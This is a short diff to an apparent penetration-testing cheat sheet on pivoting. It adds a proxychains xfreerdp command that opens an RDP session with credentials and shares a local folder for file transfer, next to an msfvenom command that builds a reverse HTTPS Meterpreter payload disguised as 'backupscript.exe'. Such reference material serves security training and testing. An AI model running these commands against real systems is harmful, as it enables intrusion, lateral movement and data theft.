@@ -82,6 +82,10 @@
     <td>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td>
 </tr>
 <tr>
+    <td><code>proxychains xfreerdp x.x.x.x /u:user /p:pass /v:website /cert:ignore +drive:smbfolder,home/user/</code></td>
+    <td>This creates a rdp session using proxychains and allows the transfer of files over an smb share</td>
+</tr>
+<tr>
     <td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td>
     <td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</td>
 </tr>
